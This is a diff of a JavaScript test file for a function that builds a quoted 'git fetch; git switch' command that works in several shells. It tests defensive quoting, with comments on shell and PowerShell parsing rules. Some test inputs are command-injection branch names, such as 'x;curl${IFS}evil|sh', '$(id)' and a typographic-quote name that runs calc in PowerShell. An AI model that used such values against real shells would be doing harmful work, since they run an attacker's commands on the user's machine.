@@ -42,30 +42,44 @@ const runTimers = timers => {
     }
 };
 
-test('switchCommand leaves a plain branch name bare', () => {
-    assert.equal(switchCommand('feature/ABC-123-export'), 'git switch feature/ABC-123-export');
-    assert.equal(switchCommand('release_2.1+hotfix@x=y,z%20'), 'git switch release_2.1+hotfix@x=y,z%20');
+// The command is pasted in bash, zsh, sh, fish, Git Bash, Windows PowerShell
+// 5.1 or PowerShell 7: `;` is the one separator they share (PowerShell 5.1
+// has no &&), and a single-quoted word is literal in all of them
+test('switchCommand fetches the branch from origin, then switches to it, the name in single quotes', () => {
+    assert.equal(switchCommand('feature/ABC-123-export'), "git fetch origin 'feature/ABC-123-export'; git switch 'feature/ABC-123-export'");
+    assert.equal(switchCommand('é'), "git fetch origin 'é'; git switch 'é'");
 });
 
-test('switchCommand puts in single quotes a name the shell would read: $, ;, |, &, a backtick, parentheses, quotes, !, #, braces', () => {
-    assert.equal(switchCommand('x;curl${IFS}evil|sh'), "git switch 'x;curl${IFS}evil|sh'");
-    assert.equal(switchCommand('a&b'), "git switch 'a&b'");
-    assert.equal(switchCommand('a`id`'), "git switch 'a`id`'");
-    assert.equal(switchCommand('a$(id)'), "git switch 'a$(id)'");
-    assert.equal(switchCommand('a"b!c#d{e}'), `git switch 'a"b!c#d{e}'`);
-    assert.equal(switchCommand('é'), "git switch 'é'");
+test('switchCommand quotes what a POSIX shell would read: $, ;, |, &, a backtick, parentheses, !, #, braces', () => {
+    assert.equal(switchCommand('x;curl${IFS}evil|sh'), "git fetch origin 'x;curl${IFS}evil|sh'; git switch 'x;curl${IFS}evil|sh'");
+    assert.equal(switchCommand('a&b`id`$(id)!c#d{e}'), "git fetch origin 'a&b`id`$(id)!c#d{e}'; git switch 'a&b`id`$(id)!c#d{e}'");
 });
 
-test('switchCommand writes a single quote in the name as \'\\\'\'', () => {
-    assert.equal(switchCommand("it's"), "git switch 'it'\\''s'");
+// PowerShell reads $ anywhere, @ and # at the start of a word, --% (stop
+// parsing), and a number-like word as a number (about_Parsing)
+test('switchCommand quotes what PowerShell would read in a bare word: $, a leading @ or #, --%, a number', () => {
+    for (const name of ['$HOME', '@args', '#x', '1.10', '0x10', 'a,b']) {
+        assert.equal(switchCommand(name), `git fetch origin '${name}'; git switch '${name}'`, name);
+    }
+    assert.equal(switchCommand('--%'), "git fetch origin --end-of-options '--%'; git switch --end-of-options '--%'");
 });
 
 // refs/heads/--detach can be pushed with plain git: `git switch --detach`
 // would leave the branch for a detached HEAD
 test('switchCommand ends the options before a name starting with -, which git would read as an option', () => {
-    assert.equal(switchCommand('-f'), 'git switch --end-of-options -f');
-    assert.equal(switchCommand('--detach'), 'git switch --end-of-options --detach');
-    assert.equal(switchCommand('-a;b'), "git switch --end-of-options '-a;b'");
+    assert.equal(switchCommand('-f'), "git fetch origin --end-of-options '-f'; git switch --end-of-options '-f'");
+    assert.equal(switchCommand('--detach'), "git fetch origin --end-of-options '--detach'; git switch --end-of-options '--detach'");
+});
+
+// A single quote is written '\'' in a POSIX shell and '' in PowerShell, which
+// also closes a single-quoted word on ‘ ’ ‚ ‛ (about_Quoting_Rules): a name
+// `x’;calc;’` would run calc there. Windows PowerShell 5.1 drops a " passed
+// to git (fixed in 7.3). Git Bash turns `x=/y` into a Windows path
+test('switchCommand gives no command for a name no quoting keeps the same in every shell: quotes, typographic quotes, =/', () => {
+    for (const name of ["it's", 'a"b', 'x’;calc;’', 'x‘y', 'x‚y', 'x‛y', 'x“y', 'x”y', 'x„y', 'a=/b']) {
+        assert.equal(switchCommand(name), null, name);
+    }
+    assert.ok(switchCommand('a=b') && switchCommand('a/b=c'));
 });
 
 // The href of Bitbucket's own "Check out in SourceTree", read on the branch
